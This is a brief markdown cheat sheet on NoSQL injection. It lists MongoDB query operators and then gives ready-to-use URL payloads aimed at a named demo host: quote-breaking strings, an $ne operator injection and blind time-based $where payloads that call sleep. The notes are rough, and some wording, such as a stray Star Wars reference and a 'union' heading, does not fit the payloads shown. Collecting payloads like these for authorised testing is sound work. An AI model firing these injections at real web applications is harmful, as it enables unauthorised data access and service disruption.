# NoSQL Injection methodology 

# NoSQL Operators 

```
$ne — not equal
$gt — greater than
$regex — regular expression
$where — clause lets you specify a script to filter results
```



# NoSQL Union Query Injection

Let try to provoke an error by submitting a string accompanied by the single quote (') character, we will come across the following
```
https://demo-campass.obih.sg/name=TestUser1'
https://demo-campass.obih.sg/name=TestUser3
https://demo-campass.obih.sg/name=Testuser3', 'address': 'WestJurong
https://demo-campass.obih.sg/name=TestUser3',name:{$ne:'A'},address:'WestJurong
```





# Blind NoSQL Injection
Suppose that the database returned no results in the browser, regardless of us submitting an included Star Wars character or not. So, we are talking about a “blind” 
```
https://demo-campass.obih.sg/?name=A',$where: 'function(){sleep(20000);}'}
https://demo-campass.obih.sg/?name=A,$where: 'function(){sleep(20000);}'}
```
